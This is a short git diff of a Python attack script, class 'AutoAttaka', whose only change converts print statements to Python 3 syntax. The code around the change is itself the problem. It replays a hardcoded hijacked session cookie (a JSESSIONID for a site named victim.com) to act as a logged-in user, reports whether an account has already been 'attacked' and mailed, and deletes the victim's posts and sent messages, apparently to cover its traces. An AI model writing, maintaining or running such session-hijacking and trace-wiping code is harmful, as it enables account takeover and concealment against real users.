@@ -82,7 +82,7 @@ class AutoAttaka:
                 #If saw img as title, then it is our target.
                 delv = ptn.findall(str(tag.parent))[0]
                 SweepBack.Sweep.sweep(delv, True)
-                print "Deleting " + str(delv)
+                print ("Deleting " + str(delv))
                 
         soup2   = BeautifulSoup(contentofSent)
         tRtag   = soup2.find_all('span', class_ = 'ComSubject')
@@ -93,14 +93,14 @@ class AutoAttaka:
                 time.sleep(1)
                 delv = ptn.findall(str(tag.parent))[0]
                 SweepBack.Sweep.sweep(delv, False)
-                print "Deleting " + str(delv)
+                print ("Deleting " + str(delv))
     
 if __name__ == "__main__":
     
     if UserInfo.dbopt.checkExistence("test") == 0:
-        print "Attack this account"
+        print ("Attack this account")
     if UserInfo.dbopt.checkExistence("test") == 1:
-        print "Stop Attack it ,already sent mail."
+        print ("Stop Attack it ,already sent mail.")
     
     cookie = "CNZZDATA3458012=cnzz_eid%3D1068221846-1472627900-http%253A%252F%252Fwww.victim.com%252F%26ntime%3D1473170900; JSESSIONID=ADFD4362887B0C21035AF44E0B42815F; jiathis_rdc=%7B%22http%3A//www.victim.com/vpost.html%3Fpid%3D36189%22%3A%220%7C1473171165538%22%7D"
     cookies= parseCookie.parseCookie(cookie)
